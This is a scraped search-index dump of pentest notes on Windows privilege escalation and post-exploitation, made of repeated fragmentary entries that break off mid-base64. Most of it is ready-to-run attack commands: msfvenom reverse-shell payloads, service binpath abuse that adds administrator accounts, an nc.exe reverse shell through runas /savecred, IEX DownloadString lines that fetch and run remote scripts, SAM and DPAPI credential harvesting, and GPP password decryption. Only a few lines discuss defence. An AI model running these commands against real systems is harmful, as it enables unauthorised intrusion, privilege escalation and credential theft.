(sp0/1) Table of patch replacements:","title":"The beginning of a comment"},{"location":"os/windows/mix/#ms11-046-ms11-080-ms12-009-ms13-093-ms14-040","text":"","title":"| MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |"},{"location":"os/windows/mix/#-","text":"","title":"-------------------------------------------------------------"},{"location":"os/windows/mix/#kb2503665-kb2592799-kb2645640-kb2875783-kb2975684","text":"","title":"| KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |"},{"location":"os/windows/mix/#-_1","text":"","title":"-----------------------------------------------------------------------------------------"},{"location":"os/windows/mix/#windows-x86-xp-sp3-installed-replaces-","text":"","title":"Windows x86 XP SP3          | Installed | &lt;-Replaces|     -     |     -     |     -     |"},{"location":"os/windows/mix/#windows-x86-server-2003-sp2-installed-replaces-replaces-replaces","text":"","title":"Windows x86 Server 2003 SP2 | Installed | &lt;-Replaces| &lt;-Replaces|     -     | &lt;-Replaces|"},{"location":"os/windows/mix/#windows-x86-vista-sp1-installed-","text":"","title":"Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |"},{"location":"os/windows/mix/#windows-x86-vista-sp2-installed-replaces","text":"","title":"Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | &lt;-Replaces|"},{"location":"os/windows/mix/#windows-x86-server-2008-installed-","text":"","title":"Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |"},{"location":"os/windows/mix/#windows-x86-server-2008-sp2-installed-replaces","text":"","title":"Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | &lt;-Replaces|"},{"location":"os/windows/mix/#windows-x86-7-installed-","text":"","title":"Windows x86 7               | Installed |     -     |     -     |     -     |     -     |"},{"location":"os/windows/mix/#windows-x86-7-sp1-installed-replaces","text":"Policy files (may contain passwords) SYSVOL/(../)Groups.xml Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes Configuration files commonly left behind by mass rollouts/older (pre-)devops c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml Trusted Service Paths exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\" icacls \"C:\\Program Files (x86)\\Target\" msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe -now replace Target\\target.exe with payload sc stop target sc start target -now the reverse shell should be spawned as privileged user Vulnerable Services exploit/windows/local/service_permissions accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula sc qc target sc config target binpath= \"net user hacker P@ssword123! /add\" sc stop target sc start target sc config target binpath= \"net localgroup Administrators hacker /add\" sc stop target sc start target -errors may occur starting service, but only after commands are executed AlwaysInstallElevated exploit/windows/local/always_install_elevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi msiexec /quiet /qn /i C:\\Users\\User\\Downloads\\exploit.msi DLL Injection msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe WIN filesystem read targets tier 1 %SYSTEMDRIVE%\\boot.ini near ubiquitous, confirmation that a read is happening %WINDIR%\\win.ini second test file if boot.ini cannot be found/returned %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM stores users' passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \\repair is locked, but can be retired using forensic or Volume Shadow copy methods %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system key to read SAM hashes in plaintext without cracking %WINDIR%\\repair\\security %SYSTEMDRIVE%\\autoexec.bat TIER 1, LOCATION NOT SET BY DEFAULT unattend.txt unattend.xml sysprep.inf --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location. tier 2 %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\software %WINDIR%\\iis6.log (or 5 or 7, given version) %WINDIR%\\system32\\logfiles\\httperr\\httperr1.log --iis6 error log %SystemDrive%\\inetpub\\logs\\LogFiles --IIS 7\u2019s logs location %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS 1\\Tempor 1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts references http://www.fuzzysecurity.com/tutorials/16.html https://www.toshellandback.com/2015/11/24/ms-priv-esc/ https://pastebin.com/FehvXsEZ https://pastebin.com/HvKs18zh","title":"Windows x86 7 SP1           | Installed |     -     |     -     |     -     | &lt;-Replaces|"},{"location":"os/windows/post-exploitation/","text":"patch level systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn whoami echo %USERNAME% net user net localgroup users in a domain net user /domain net group /domain net group /domain Firewall netsh firewall show state netsh firewall show config Network ipconfig /all route print arp -A Scheduled Tasks schtasks /query /fo LIST /v --copy output and save in txt cat schtask.txt | grep \"SYSTEM|Task To Run\" | grep -B 1 SYSTEM dir %SystemRoot%\\Tasks e.g. c:\\windows\\tasks e.g. c:\\windows\\system32\\tasks Weak Service Permissions Check service config can be modify or not accesschk.exe /accepteula accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula accesschk.exe -ucqv \\ sc qc \\ -- Get service details Check service with weak file permission User c:\\windows\\temp wmic.exe for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a c:\\windows\\temp\\permissions.txt for /f eol = \"^ delims = \" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" sc.exe sc query state= all | findstr \"SERVICE_NAME:\" Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" path.txt Unquoted Service Path wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\" |findstr /i /v \"\"\" sc query sc qc service name AlwaysInstallElevated IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Service only available from inside netstat -ano upload plink.exe plink.exe -R \"remote port\":127.0.0.1:\"local port\" root@\"ipaddress\" Pasword in files https://pentestlab.blog/tag/privilege-escalation/page/3/ cmdkey /list If there are entries, it means that we may able to runas certain user who stored his cred in windows runas /savecred /user:ACCESS\\Administrator \"c:\\windows\\system32\\cmd.exe /c \\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe\" Can we find any SAM files? %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system findstr / si password * . txt findstr / si password * . xml findstr / si password * . ini findstr / si pass / pwd * . ini dir / s * pass * == * cred * == * vnc * == * . config * in all files findstr / spin password * . * findstr / spin password * . * Unattended? vnc? c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir / b / s unattend . xml dir / b / s web . config dir / b / s sysprep . inf dir / b / s sysprep . xml dir / b / s * pass * dir c : \\ * vnc . ini / s / b dir c : \\ * ultravnc . ini / s / b dir c : \\ / s / b | findstr / si * vnc . ini VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" reg query \"HKCU\\Software\\TightVNC\\Server\" Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2 nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"Post exploitation"},{"location":"os/windows/post-exploitation/#patch-level","text":"systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn whoami echo %USERNAME% net user net localgroup users in a domain net user /domain net group /domain net group /domain","title":"patch level"},{"location":"os/windows/post-exploitation/#firewall","text":"netsh firewall show state netsh firewall show config","title":"Firewall"},{"location":"os/windows/post-exploitation/#network","text":"ipconfig /all route print arp -A","title":"Network"},{"location":"os/windows/post-exploitation/#scheduled-tasks","text":"schtasks /query /fo LIST /v --copy output and save in txt cat schtask.txt | grep \"SYSTEM|Task To Run\" | grep -B 1 SYSTEM dir %SystemRoot%\\Tasks e.g. c:\\windows\\tasks e.g. c:\\windows\\system32\\tasks","title":"Scheduled Tasks"},{"location":"os/windows/post-exploitation/#weak-service-permissions","text":"Check service config can be modify or not accesschk.exe /accepteula accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula accesschk.exe -ucqv \\ sc qc \\ -- Get service details Check service with weak file permission User c:\\windows\\temp wmic.exe for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a c:\\windows\\temp\\permissions.txt for /f eol = \"^ delims = \" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" sc.exe sc query state= all | findstr \"SERVICE_NAME:\" Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" path.txt","title":"Weak Service Permissions"},{"location":"os/windows/post-exploitation/#unquoted-service-path","text":"wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\" |findstr /i /v \"\"\" sc query sc qc service name","title":"Unquoted Service Path"},{"location":"os/windows/post-exploitation/#alwaysinstallelevated-if-64-bits-use-systemrootsysnativeregexe","text":"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated","title":"AlwaysInstallElevated &lt;&lt; IF 64 bits use:  %SystemRoot%\\Sysnative\\reg.exe"},{"location":"os/windows/post-exploitation/#service-only-available-from-inside","text":"netstat -ano upload plink.exe plink.exe -R \"remote port\":127.0.0.1:\"local port\" root@\"ipaddress\"","title":"Service only available from inside"},{"location":"os/windows/post-exploitation/#pasword-in-files","text":"https://pentestlab.blog/tag/privilege-escalation/page/3/ cmdkey /list If there are entries, it means that we may able to runas certain user who stored his cred in windows runas /savecred /user:ACCESS\\Administrator \"c:\\windows\\system32\\cmd.exe /c \\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe\" Can we find any SAM files? %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system findstr / si password * . txt findstr / si password * . xml findstr / si password * . ini findstr / si pass / pwd * . ini dir / s * pass * == * cred * == * vnc * == * . config * in all files findstr / spin password * . * findstr / spin password * . * Unattended? vnc? c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir / b / s unattend . xml dir / b / s web . config dir / b / s sysprep . inf dir / b / s sysprep . xml dir / b / s * pass * dir c : \\ * vnc . ini / s / b dir c : \\ * ultravnc . ini / s / b dir c : \\ / s / b | findstr / si * vnc . ini","title":"Pasword in files"},{"location":"os/windows/post-exploitation/#vnc","text":"reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" reg query \"HKCU\\Software\\TightVNC\\Server\"","title":"VNC"},{"location":"os/windows/post-exploitation/#windows-autologin","text":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2 nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"","title":"Windows autologin"},{"location":"os/windows/post-exploitation/#snmp-paramters","text":"reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"","title":"SNMP Paramters"},{"location":"os/windows/post-exploitation/#putty","text":"reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"","title":"Putty"},{"location":"os/windows/post-exploitation/#search-for-password-in-registry","text":"reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"Search for password in registry"},{"location":"os/windows/privilege-escalation/","text":"Privilege Escalation Options Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services Guides https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html Tools https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb Metasploit In 32bit systems: local_exploit_suggester In 64bit systems: search exploit / windows / local PowerUp PowerUp to check for all service misconfigurations: Invoke - AllChecks Service Unquoted Path Get-ServiceUnquoted -Verbose Get-WmiObject -Class win32_service | f ` * When service path is unquoted: C : \\ PROGRAM FILES \\ SUB DIR \\ PROGRAM NAME Areas we can place files for exploit are marked with * C : \\ PROGRAM * FILES \\ SUB * DIR \\ PROGRAM * NAME Examples: c : \\ program . exe files \\ sub dir \\ program name c : \\ program files \\ sub . exe dir \\ program name c : \\ program files \\ sub dir \\ program . exe name Service binary in a location writable to current user Replace the binary to gain code execution. Get - ModifiableServiceFile - Verbose Service can be modified by current user Get - ModifiableService - Verbose Techniques Service Unquoted Path exploit / windows / local / trusted_service_path wmic service get name , displayname , pathname , startmode | findstr / i Auto | findstr / i / v C:\\Windows\\\\ | findstr / i / v C : \\ Program Files ( x86 ) \\ Program Folder \\ A Subfolder \\ Executable . exe Leads to running : C : \\ Program . exe C : \\ Program Files . exe C : \\ Program Files ( x86 ) \\ Program . exe C : \\ Program Files ( x86 ) \\ Program Folder \\ A . exe C : \\ Program Files ( x86 ) \\ Program Folder \\ A Subfolder \\ Executable . exe Insecure Setup: C : \\ Program Files ( x86 ) icacls C:\\Program Files (x86)\\Program Folder / grant Everyone :( OI )( CI ) F / T F = Full Control CI = Container Inherit \u2013 This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit \u2013 This flag indicates that subordinate files will inherit the ACE . sc stop Vulnerable Service sc start Vulnerable Service OR shutdown / r / t 0 Need to migrate (auto-migration) Folder Service Executable Privileges When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example . exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE . OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE . accesschk . exe - dqv C:\\ / accepteula Insecure Service Permissions exploit / windows / local / service_permissions Approach 1 - Check permissions of service subinacl . exe / keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service / display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service / t REG_EXPAND_SZ / v ImagePath / d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe / f or create a local admin with: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin / add Approach 2 - Check services a given user can edit accesschk . exe - uwcqv testuser * accesschk . exe - uwcqv Authenticated Users * / accepteula accesschk . exe - uwcqv * / accepteula sc config upnphost binpath = net user /add amxuser1 amxpass1234 sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath = net localgroup administrators amxuser1 /add sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost sc config upnphost binpath = net localgroup \\ Remote Desktop Users \\ amxuser1 /add sc config upnphost obj = .\\LocalSystem password = sc qc upnphost net stop upnphost net start upnphost net start upnphost AlwaysInstallElevated exploit / windows / local / always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated = dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated = dword:00000001 reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer / v AlwaysInstallElevated reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer / v AlwaysInstallElevated Installing MSI: msiexec / quiet / qn / i malicious . msi Payload Generation: msfvenom - f msi - nouac - p windows / adduser USER = eviladmin PASS = P4ssw0rd @ - o add_user . msi msfvenom - p windows / meterpreter / reverse_tcp - e x86 / shikata_ga_nai LHOST = 192 . 168 . 2 . 60 LPORT = 8989 - f exe - o Payload . exe msfvenom - f msi - nouac - p windows / exec cmd = C:\\Users \\t estuser\\AppData\\Local\\Temp\\Payload.exe malicious . msi Task Scheduler On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06 : 42 / interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe DLL Hijacking (DLL preloading attack or a binary planting attack) https://github.com/Arvanaghi/Windows-DLL-Injector https://securityxploded.com/remote-dll-injector.php https://pentestlab.blog/2017/04/04/dll-injection/ https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic - link library without specifying a fully qualified path name , Windows attempts to locate the DLL by searching a well - defined set of directories in a particular order , as described in Dynamic - Link Library Search Order . The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) Services running under SYSTEM does not search through user path environment. Example: # include stdafx.h # include windows.h void _tmain ( int argc , _TCHAR * argv [] ) { LoadLibrary ( L hijackable.dll ) ; } Identify processes / services - Use procman ( https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx ). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ). msfvenom - p windows / x64 / meterpreter / reverse_tcp lhost = 192 . 168 . 2 . 60 lport = 8989 - f dll hijackable . dll Windows 7 IKE and AuthIP IPsec Keying Modules ( IKEEXT ) \u2013 wlbsctrl . dll Windows Media Center Receiver Service ( ehRecvr ) \u2013 ehETW . dll Windows Media Center Scheduler Service ( ehSched ) \u2013 ehETW . dll Can run Media Center services over command line: schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ mcupdate \u201d schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ MediaCenterRecoveryTask \u201d schtasks . exe / run / I / TN \u201c\\ Microsoft \\ Windows \\ Media Center \\ ActivateWindowsSearch \u201d Windows XP Automatic Updates ( wuauserv ) \u2013 ifsproxy . dll Remote Desktop Help Session Manager ( RDSessMgr ) \u2013 SalemHook . dll Remote Access Connection Manager ( RasMan ) \u2013 ipbootp . dll Windows Management Instrumentation ( winmgmt ) \u2013 wbemcore . dll Audio Service ( STacSV ) \u2013 SFFXComm . dll SFCOM . DLL Intel ( R ) Rapid Storage Technology ( IAStorDataMgrSvc ) \u2013 DriverSim . dll Juniper Unified Network Service ( JuniperAccessService ) \u2013 dsLogService . dll Encase Enterprise Agent \u2013 SDDisk . dll Migrations CWDIllegalInDllSearch Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 1, 2 or ffffffff ? The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ dlls not loaded ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C :\\ program files \\ MyApp \\ 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory(\"\") The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SafeDllSearchMode Enabled by default Can disable using [ HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Control \\ Session Manager ] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory. DEV LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) When disabled The directory from which the application loaded [ moved up the list ] The current working directory ( CWD ) 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) Directories in the PATH environment variable ( system then user ) Stored Credentials C : \\ unattend . xml C : \\ sysprep . inf C : \\ sysprep \\ sysprep . xml dir c : \\ * vnc . ini / s / b / c dir c : \\ * ultravnc . ini / s / b / c dir c : \\ / s / b / c | findstr / si * vnc . ini findstr / si password * . txt | * . xml | * . ini findstr / si pass * . txt | * . xml | * . ini Unattended Installations post / windows / gather / enum_unattend Look for UserAccounts tag of Unattend . xml , sysprep . xml and sysprep . inf across the system, including: C : \\ Windows \\ Panther \\ C : \\ Windows \\ Panther \\ Unattend \\ C : \\ Windows \\ System32 \\ C : \\ Windows \\ System32 \\ sysprep \\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them. Group Policy Preferences (GPP) Introduced from Windows Server 2008 https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati GPP allows for configuration of Domain-attached machines via group policy . Map drives (Drives.xml) Create Local Users Data Sources (DataSources.xml) Printer configuration (Printers.xml) Create/Update Services (Services.xml) Scheduled Tasks (ScheduledTasks.xml) Change local Administrator passwords GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. \\\\ DOMAIN \\ SYSVOL \\ DOMAIN \\ Policies \\ findstr / S / I cpassword \\\\ FQDN \\ sysvol \\ FQDN \\ policies \\ * . xml Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged - in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups . xml files buried in the SYSVOL folder ( \\\\ Domain \\ SYSVOL \\ DOMAIN \\ Policies ) cpassword is used to set passwords for the Local Administrator account. Password is AES-256 encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post / windows / gather / credentials / gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Get-CachedGPPPassword //For locally stored GP Files Get-GPPPassword //For GP Files stored in the DC Get - DecryptedPassword to decrypt the AES encryption http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip https://pentestlab.blog/tag/cpassword/ Decrypt encrypted password: gpp - decrypt $ cpassword Get - GPPPassword Get - NetOU - GUID {4C86DD57-4040-41CD-B163-58F208A26623} | % { Get - NetComputer - ADSPath $ _ } // All OUs connected to policy | List all domain machines tied to OU IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerUp.ps1 ) IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerView.ps1 ) Get - CachedGPPPassword Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899 Defense Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords. [ALERTING] Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied) Token Impersonation PowerSploit / Incognito List all tokens Invoke - TokenManipulation - ShowAll List all unique and usable tokens Invoke - TokenManipulation - Enumerate Start new process with token of a user Invoke - TokenManipulation - ImpersonateUser - Username domain\\user Start new process with token of another process Invoke - TokenManipulation - CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500 cmdkey Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list Run a command as admin: runas / user : ACCESS \\ Administrator / savecred \u200b powershell - c IEX ( New - Object Net . Webclient ). downloadstring ( http://10.10.14.2/admin.ps1 ) powershell . exe - Credential TestDomain\\Me - NoNewWindow - ArgumentList Start-Process powershell.exe -Verb runAs Find all runas shortcuts: Get - ChildItem \u200b \u200b C:\\ \u200b * . lnk - Recurse - Force | ft fullname | \u200b Out - File \u200b shortcuts . txt ForEach \u200b ( \u200b $ file \u200b \u200b in \u200b gc . \\ shortcuts . txt ) { \u200b Write - Output \u200b \u200b $ file \u200b ; gc \u200b $ file \u200b | Select - String \u200b runas } Windows Data Protection API Locating credential files cmd \u200b / c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [ Convert ]:: ToBase64String ( [ IO.File ]:: ReadAllBytes ( \u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [ IO.File ]:: WriteAllBytes ( \u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [ Convert ]:: FromBase64String ( \u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd 